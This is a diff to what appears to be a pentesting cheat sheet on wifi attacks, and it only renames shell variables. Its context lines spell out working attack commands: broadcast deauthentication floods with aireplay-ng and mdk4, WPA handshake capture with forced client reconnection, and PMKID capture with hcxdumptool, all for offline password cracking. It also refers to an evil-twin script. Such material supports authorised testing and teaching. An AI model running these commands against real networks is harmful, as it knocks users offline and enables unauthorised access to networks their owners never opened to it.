@@ -87,14 +87,14 @@ sudo ./eviltwinx.sh
 
 ```bash [aireplay-ng]
 # Broadcast deauth to all clients of the AP
-sudo aireplay-ng -0 0 -a $bssid wlan0mon
+sudo aireplay-ng -0 0 -a $BSSID wlan0mon
 ```
 
 ```bash [mdk4]
 # Deauth all clients from a specific AP (unlimited speed)
-sudo mdk4 wlan0mon d -B $bssid
+sudo mdk4 wlan0mon d -B $BSSID
 # Deauth with stealth mode (faster)
-sudo mdk4 wlan0mon d -B $bssid -x
+sudo mdk4 wlan0mon d -B $BSSID -x
 ```
 
 :::
@@ -105,10 +105,10 @@ Capture the WPA/WPA2 handshake to crack it offline using dictionary or brute-for
 
 ```bash
 # Start capturing packets on the target channel
-sudo airodump-ng -c <CH> --bssid $bssid -w capture wlan0mon
+sudo airodump-ng -c <CH> --bssid $BSSID -w capture wlan0mon
 
 # Force reconnection to capture the handshake
-sudo aireplay-ng -0 5 -a $bssid -c $client_mac wlan0mon
+sudo aireplay-ng -0 5 -a $BSSID -c $CLIENT_MAC wlan0mon
 
 # PMKID capture (no client needed)
 sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
